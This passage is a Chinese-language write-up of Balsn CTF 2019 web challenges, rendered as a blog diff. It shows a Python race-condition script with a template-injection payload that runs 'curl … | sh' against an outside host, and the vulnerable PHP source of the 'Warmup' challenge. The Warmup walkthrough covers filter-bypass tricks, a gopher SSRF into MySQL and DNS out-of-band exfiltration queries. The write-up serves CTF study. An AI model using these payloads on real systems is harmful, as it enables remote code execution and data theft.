class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish4.balsnctf.com/index.php'</span></span><br><span class="line">sess_name = <span class="string">'iamkaibro'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">&#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">&#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %&#125;&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="最后getshell成功。"><a href="#最后getshell成功。" class="headerlink" title="最后getshell成功。"></a>最后getshell成功。</h5><h4 id="0x02-Warmup"><a href="#0x02-Warmup" class="headerlink" title="0x02 Warmup"></a>0x02 Warmup</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><h5 id="Baby-PHP-challenge-again"><a href="#Baby-PHP-challenge-again" class="headerlink" title="Baby PHP challenge again."></a>Baby PHP challenge again.</h5><ul>
+<li>Difficulty:难</li>
+<li>Type:Web</li>
+<li>Solved:5/720</li>
+<li>Tag:PHP,SSRF,MySQL,Windows<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a><a href="https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Warmup/index.php" target="_blank" rel="noopener">源码</a></h5><h5 id="这个题目涉及到许多的php原理和古老的php-windows技巧。"><a href="#这个题目涉及到许多的php原理和古老的php-windows技巧。" class="headerlink" title="这个题目涉及到许多的php原理和古老的php/windows技巧。"></a>这个题目涉及到许多的php原理和古老的php/windows技巧。</h5><h5 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1"></a>step 1</h5><h5 id="刚开始拿到源码发现非常的难读，我们需要重构一下。"><a href="#刚开始拿到源码发现非常的难读，我们需要重构一下。" class="headerlink" title="刚开始拿到源码发现非常的难读，我们需要重构一下。"></a>刚开始拿到源码发现非常的难读，我们需要重构一下。</h5><h5 id="下面是重构后的源码："><a href="#下面是重构后的源码：" class="headerlink" title="下面是重构后的源码："></a>下面是重构后的源码：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// This is the meme image location</span></span><br><span class="line">    $secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span>.<span class="string">"Z9VaSkYzcjMJpvCt=="</span>));</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    </span><br><span class="line">    $op = @$_GET[<span class="string">'op'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>) &#123;</span><br><span class="line">    </span><br><span class="line">        $_ = @$_GET[<span class="string">'Σ&gt;―(#°ω°#)♡→'</span>];</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>( preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>,$_) || @strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> || @strlen($_) &gt; <span class="number">19</span> )</span><br><span class="line">            <span class="keyword">exit</span>($secret);</span><br><span class="line">        </span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        @curl_setopt($ch, CURLOPT_URL, </span><br><span class="line">                str_replace(<span class="string">"%33%33%61"</span>, <span class="string">"&gt;__&lt;"</span>, </span><br><span class="line">                str_replace(<span class="string">"%63%3a"</span>, <span class="string">"WTF"</span>, str_replace(<span class="string">"633a"</span>, <span class="string">":)"</span>, </span><br><span class="line">                str_repLace(<span class="string">"433a"</span>, <span class="string">":("</span>, </span><br><span class="line">                str_replace(<span class="string">"\x63:"</span>, <span class="string">"ggininder"</span>, </span><br><span class="line">                strtolower(</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="string">"return $_;"</span>)</span><br><span class="line">                ))))))</span><br><span class="line">        );</span><br><span class="line">        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">        @curl_EXEC($ch);</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(@stRLEn($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="comment">// There is a invisible character here. (\xe2\x81\xa3)</span></span><br><span class="line">            $_ = @$_GET[<span class="string">'⁣'</span>];</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>) || </span><br><span class="line">               (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>) || </span><br><span class="line">               (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>) || </span><br><span class="line">               (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>) || </span><br><span class="line">               (stripos($_,<span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>) || </span><br><span class="line">               (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">                    <span class="keyword">die</span>($secret);</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(stripos($_, <span class="string">".."</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            </span><br><span class="line">            print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// It is useless, because there is a die function before it. :D</span></span><br><span class="line">            system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2"></a>step 2</h5><h5 id="我们现在初始去读取config-php"><a href="#我们现在初始去读取config-php" class="headerlink" title="我们现在初始去读取config.php"></a>我们现在初始去读取<code>config.php</code></h5><h5 id="有两个方式可以去用："><a href="#有两个方式可以去用：" class="headerlink" title="有两个方式可以去用："></a>有两个方式可以去用：</h5><h5 id="1-使用file-get-contents-预期"><a href="#1-使用file-get-contents-预期" class="headerlink" title="1.使用file_get_contents()(预期)"></a>1.使用<code>file_get_contents()</code>(预期)</h5><h5 id="2-使用eval-非预期"><a href="#2-使用eval-非预期" class="headerlink" title="2.使用eval()(非预期)"></a>2.使用<code>eval()</code>(非预期)</h5><h5 id="方法-0x1"><a href="#方法-0x1" class="headerlink" title="方法 0x1"></a>方法 0x1</h5><h5 id="if-stRLEn-op-lt-4-amp-amp-op-78-lt-39-A-A-39"><a href="#if-stRLEn-op-lt-4-amp-amp-op-78-lt-39-A-A-39" class="headerlink" title="if(@stRLEn($op) &lt; 4 &amp;&amp; @($op + 78) &lt; &#39;A__A&#39;)"></a><code>if(@stRLEn($op) &lt; 4 &amp;&amp; @($op + 78) &lt; &#39;A__A&#39;)</code></h5><h5 id="对于这段代码我们可以用op-99来绕过。"><a href="#对于这段代码我们可以用op-99来绕过。" class="headerlink" title="对于这段代码我们可以用op=-99来绕过。"></a>对于这段代码我们可以用<code>op=-99</code>来绕过。</h5><h5 id="之后我们可以输入我们的文件名到file-get-contents"><a href="#之后我们可以输入我们的文件名到file-get-contents" class="headerlink" title="之后我们可以输入我们的文件名到file_get_contents():"></a>之后我们可以输入我们的文件名到<code>file_get_contents()</code>:</h5><h5 id="GET-39-39"><a href="#GET-39-39" class="headerlink" title="$_GET[&#39;&#39;];"></a><code>$_GET[&#39;&#39;];</code></h5><h5 id="这个参数-GET的参数是-xE2-x81-xA3，它是一个不可见的字符。"><a href="#这个参数-GET的参数是-xE2-x81-xA3，它是一个不可见的字符。" class="headerlink" title="这个参数$_GET的参数是\xE2\x81\xA3，它是一个不可见的字符。"></a>这个参数<code>$_GET</code>的参数是<code>\xE2\x81\xA3</code>，它是一个不可见的字符。</h5><h5 id="我们的目的是去阅读config-php，但是对我们输入的一些文件名有检查。"><a href="#我们的目的是去阅读config-php，但是对我们输入的一些文件名有检查。" class="headerlink" title="我们的目的是去阅读config.php，但是对我们输入的一些文件名有检查。"></a>我们的目的是去阅读<code>config.php</code>，但是对我们输入的一些文件名有检查。</h5><h5 id="我们不能使用-php，php-的文件名后缀并且我们的文件名不能包含-quot-gt-lt-amp-。"><a href="#我们不能使用-php，php-的文件名后缀并且我们的文件名不能包含-quot-gt-lt-amp-。" class="headerlink" title="我们不能使用.php，php.的文件名后缀并且我们的文件名不能包含&quot;,&gt;,&lt;,amp,$,..。"></a>我们不能使用<code>.php</code>，<code>php.</code>的文件名后缀并且我们的文件名不能包含<code>&quot;</code>,<code>&gt;</code>,<code>&lt;</code>,<code>amp</code>,<code>$</code>,<code>..</code>。</h5><h5 id="为了去绕过这个限制去阅读php源代码，你仅仅需要去添加一个空格-20-："><a href="#为了去绕过这个限制去阅读php源代码，你仅仅需要去添加一个空格-20-：" class="headerlink" title="为了去绕过这个限制去阅读php源代码，你仅仅需要去添加一个空格(%20)："></a>为了去绕过这个限制去阅读php源代码，你仅仅需要去添加一个空格(%20)：</h5><h5 id="config-php-SPACE"><a href="#config-php-SPACE" class="headerlink" title="config.php[SPACE]"></a><code>config.php[SPACE]</code></h5><h5 id="Because-the-server-is-running-on-Windows-there-are-some-weird-path-normalization-rule-here-p"><a href="#Because-the-server-is-running-on-Windows-there-are-some-weird-path-normalization-rule-here-p" class="headerlink" title="(Because the server is running on Windows, there are some weird path normalization rule here :p)"></a>(Because the server is running on Windows, there are some weird path normalization rule here :p)</h5><h5 id="你如果尝试去读取源代码config-php使用如下payload"><a href="#你如果尝试去读取源代码config-php使用如下payload" class="headerlink" title="你如果尝试去读取源代码config.php使用如下payload:"></a>你如果尝试去读取源代码<code>config.php</code>使用如下payload:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=config.php%20</span><br></pre></td></tr></table></figure>
+
+<h5 id="你将会得到config-php的内容。"><a href="#你将会得到config-php的内容。" class="headerlink" title="你将会得到config.php的内容。"></a>你将会得到<code>config.php</code>的内容。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // ***********************************</span><br><span class="line">    // THIS IS THE CONFIG OF THE MYSQL DB</span><br><span class="line">    // ***********************************</span><br><span class="line">    $host = &quot;loca</span><br></pre></td></tr></table></figure>
+
+<h5 id="因为file-get-contents-的第三个参数是155。"><a href="#因为file-get-contents-的第三个参数是155。" class="headerlink" title="因为file_get_contents()的第三个参数是155。"></a>因为<code>file_get_contents()</code>的第三个参数是155。</h5><h5 id="我们应该使用一些特殊的php包装器来解压缩config-php的内容。"><a href="#我们应该使用一些特殊的php包装器来解压缩config-php的内容。" class="headerlink" title="我们应该使用一些特殊的php包装器来解压缩config.php的内容。"></a>我们应该使用一些特殊的php包装器来解压缩<code>config.php</code>的内容。</h5><h5 id="因此php-filter-zlib-deflate是最好的选择。"><a href="#因此php-filter-zlib-deflate是最好的选择。" class="headerlink" title="因此php://filter/zlib.deflate是最好的选择。"></a>因此<code>php://filter/zlib.deflate</code>是最好的选择。</h5><h5 id="使用zlib-deflate压缩内容，然后使用zlib-inflate解压缩内容。"><a href="#使用zlib-deflate压缩内容，然后使用zlib-inflate解压缩内容。" class="headerlink" title="使用zlib.deflate压缩内容，然后使用zlib.inflate解压缩内容。"></a>使用<code>zlib.deflate</code>压缩内容，然后使用<code>zlib.inflate</code>解压缩内容。</h5><h5 id="脚本如下："><a href="#脚本如下：" class="headerlink" title="脚本如下："></a>脚本如下：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">$a = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line">$idx=strpos($a,<span class="string">"&lt;/code&gt;"</span>)+<span class="number">7</span>;</span><br><span class="line">file_put_contents(<span class="string">"./tmp/tmp"</span>,substr($a,$idx));</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=./tmp/tmp"</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="你将会看见config-php的内容。"><a href="#你将会看见config-php的内容。" class="headerlink" title="你将会看见config.php的内容。"></a>你将会看见<code>config.php</code>的内容。</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="方法-0x2"><a href="#方法-0x2" class="headerlink" title="方法 0x2"></a>方法 0x2</h5><h5 id="我们还可以使用eval-来读取config-php。"><a href="#我们还可以使用eval-来读取config-php。" class="headerlink" title="我们还可以使用eval()来读取config.php。"></a>我们还可以使用<code>eval()</code>来读取<code>config.php</code>。</h5><h5 id="在这个eval-函数中，你输入的-将会放到eval-quot-return-quot-。"><a href="#在这个eval-函数中，你输入的-将会放到eval-quot-return-quot-。" class="headerlink" title="在这个eval()函数中，你输入的$_将会放到eval(&quot;return $_;&quot;)。"></a>在这个<code>eval()</code>函数中，你输入的<code>$_</code>将会放到<code>eval(&quot;return $_;&quot;)</code>。</h5><h5 id="但是有个严格的正则表达式来控制："><a href="#但是有个严格的正则表达式来控制：" class="headerlink" title="但是有个严格的正则表达式来控制："></a>但是有个严格的正则表达式来控制：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if( preg_match(&apos;/[\x00-!\&apos;0-9&quot;`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i&apos;,$_) || @strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd || @strlen($_) &gt; 19 )</span><br><span class="line">    exit($secret);</span><br></pre></td></tr></table></figure>
+
+<h5 id="然而我们可以使用-来绕过许多的限制。"><a href="#然而我们可以使用-来绕过许多的限制。" class="headerlink" title="然而我们可以使用~来绕过许多的限制。"></a>然而我们可以使用<code>~</code>来绕过许多的限制。</h5><h5 id="例如：-urldecode-quot-8D-9A-9E-9B-99-96-93-9A-quot-等价于readfile"><a href="#例如：-urldecode-quot-8D-9A-9E-9B-99-96-93-9A-quot-等价于readfile" class="headerlink" title="例如：~urldecode(&quot;%8D%9A%9E%9B%99%96%93%9A&quot;)等价于readfile"></a>例如：<code>~urldecode(&quot;%8D%9A%9E%9B%99%96%93%9A&quot;)</code>等价于<code>readfile</code></h5><h5 id="在windows中，有一些MAGIC通配符功能可用于路径标准化。"><a href="#在windows中，有一些MAGIC通配符功能可用于路径标准化。" class="headerlink" title="在windows中，有一些MAGIC通配符功能可用于路径标准化。"></a>在windows中，有一些MAGIC通配符功能可用于路径标准化。</h5><h5 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h5><h5 id="gt-将匹配一个任意字符。-例如-在linux中"><a href="#gt-将匹配一个任意字符。-例如-在linux中" class="headerlink" title="&gt;将匹配一个任意字符。(例如?在linux中)"></a><code>&gt;</code>将匹配一个任意字符。(例如<code>?</code>在linux中)</h5><h5 id="lt-将匹配零个或者多个任意字符。-例如-在linux中"><a href="#lt-将匹配零个或者多个任意字符。-例如-在linux中" class="headerlink" title="&lt;将匹配零个或者多个任意字符。(例如*在linux中)"></a><code>&lt;</code>将匹配零个或者多个任意字符。(例如<code>*</code>在linux中)</h5><h5 id="结合-技巧和-lt-技巧："><a href="#结合-技巧和-lt-技巧：" class="headerlink" title="结合~技巧和&lt;技巧："></a>结合<code>~</code>技巧和<code>&lt;</code>技巧：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?op=-9&amp;Σ&gt;―(%23°ω°%23)♡→=(~%8D%9A%9E%9B%99%96%93%9A)(~%9C%90%C3%C3)</span><br></pre></td></tr></table></figure>
+
+<h5 id="与readfile-quot-co-lt-lt-quot-相同"><a href="#与readfile-quot-co-lt-lt-quot-相同" class="headerlink" title="(与readfile(&quot;co&lt;&lt;&quot;)相同)"></a>(与<code>readfile(&quot;co&lt;&lt;&quot;)</code>相同)</h5><h5 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h5><h5 id="config-php的内容告诉我们flag是在MySQL-数据库中，我们接下来的目标是去查询MySQL-Server并且获取结果。"><a href="#config-php的内容告诉我们flag是在MySQL-数据库中，我们接下来的目标是去查询MySQL-Server并且获取结果。" class="headerlink" title="config.php的内容告诉我们flag是在MySQL 数据库中，我们接下来的目标是去查询MySQL Server并且获取结果。"></a><code>config.php</code>的内容告诉我们flag是在MySQL 数据库中，我们接下来的目标是去查询MySQL Server并且获取结果。</h5><h5 id="并且我们知道这个user是admin并且密码是空的，因此我们可以用gopher-协议来SSRF去查询mysql-server。"><a href="#并且我们知道这个user是admin并且密码是空的，因此我们可以用gopher-协议来SSRF去查询mysql-server。" class="headerlink" title="并且我们知道这个user是admin并且密码是空的，因此我们可以用gopher://协议来SSRF去查询mysql server。"></a>并且我们知道这个user是<code>admin</code>并且密码是空的，因此我们可以用<code>gopher://</code>协议来SSRF去查询mysql server。</h5><h5 id="但是gopher的payload是十分长的，因此我们首先需要去绕过这个正则表达式。"><a href="#但是gopher的payload是十分长的，因此我们首先需要去绕过这个正则表达式。" class="headerlink" title="但是gopher的payload是十分长的，因此我们首先需要去绕过这个正则表达式。"></a>但是gopher的payload是十分长的，因此我们首先需要去绕过这个正则表达式。</h5><h5 id="如果你尝试去搜索全部的PHP函数，并且满足这个正则规则和长度限制，你将会发现一个可用的函数getenv"><a href="#如果你尝试去搜索全部的PHP函数，并且满足这个正则规则和长度限制，你将会发现一个可用的函数getenv" class="headerlink" title="如果你尝试去搜索全部的PHP函数，并且满足这个正则规则和长度限制，你将会发现一个可用的函数getenv()"></a>如果你尝试去搜索全部的PHP函数，并且满足这个正则规则和长度限制，你将会发现一个可用的函数<code>getenv()</code></h5><h5 id="这个函数会返回一个特别的头部值。"><a href="#这个函数会返回一个特别的头部值。" class="headerlink" title="这个函数会返回一个特别的头部值。"></a>这个函数会返回一个特别的头部值。</h5><h5 id="因此我们能将我们的gopher的payload放到这个HTTP-header"><a href="#因此我们能将我们的gopher的payload放到这个HTTP-header" class="headerlink" title="因此我们能将我们的gopher的payload放到这个HTTP header:"></a>因此我们能将我们的gopher的payload放到这个HTTP header:</h5><h5 id="98-9A-8B-9A-91-89-B7-AB-AB-AF-A0-AB-length-18"><a href="#98-9A-8B-9A-91-89-B7-AB-AB-AF-A0-AB-length-18" class="headerlink" title="(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB) (length: 18)"></a><code>(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB)</code> (length: 18)</h5><h5 id="它等价于getenv-quot-HTTP-T-quot-。"><a href="#它等价于getenv-quot-HTTP-T-quot-。" class="headerlink" title="它等价于getenv(&quot;HTTP_T&quot;)。"></a>它等价于<code>getenv(&quot;HTTP_T&quot;)</code>。</h5><h5 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h5><h5 id="现在我们可以SSRF："><a href="#现在我们可以SSRF：" class="headerlink" title="现在我们可以SSRF："></a>现在我们可以SSRF：</h5><h5 id="现在，您有一个盲目的SSRF！"><a href="#现在，您有一个盲目的SSRF！" class="headerlink" title="现在，您有一个盲目的SSRF！"></a>现在，您有一个盲目的SSRF！</h5><h5 id="对于MySQL协议，可以使用Gopherus之类的一些工具来创建gopher负载。"><a href="#对于MySQL协议，可以使用Gopherus之类的一些工具来创建gopher负载。" class="headerlink" title="对于MySQL协议，可以使用Gopherus之类的一些工具来创建gopher负载。"></a>对于MySQL协议，可以使用Gopherus之类的一些工具来创建gopher负载。</h5><h5 id="最后，您只需要使用基于时间或带外（DNS日志）的方法来提取查询结果。"><a href="#最后，您只需要使用基于时间或带外（DNS日志）的方法来提取查询结果。" class="headerlink" title="最后，您只需要使用基于时间或带外（DNS日志）的方法来提取查询结果。"></a>最后，您只需要使用基于时间或带外（DNS日志）的方法来提取查询结果。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&quot;\\\\&quot;,table_name,&quot;.e222e6f24ba81a9b414f.d.zhack.ca/a&quot;)) from information_schema.tables where table_schema=&quot;ThisIsTheDbName&quot;;</span><br><span class="line">Output: fl4ggg</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,column_name,&quot;.e222e6f24ba81a9b414f.d.zhack.ca/a&quot;)) from information_schema.columns where table_name=&quot;fl4ggg&quot;;</span><br><span class="line">Output: the_flag_col</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,hex(the_flag_col),&quot;.e222e6f24ba81a9b414f.d.zhack.ca/a&quot;)) from ThisIsTheDbName.fl4ggg;</span><br><span class="line">Output: 42616C736E7B337A5F77316E643077735F7068705F6368346C7D</span><br><span class="line">hex to ascii: Balsn&#123;3z_w1nd0ws_php_ch4l&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="最后的脚本："><a href="#最后的脚本：" class="headerlink" title="最后的脚本："></a>最后的脚本：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 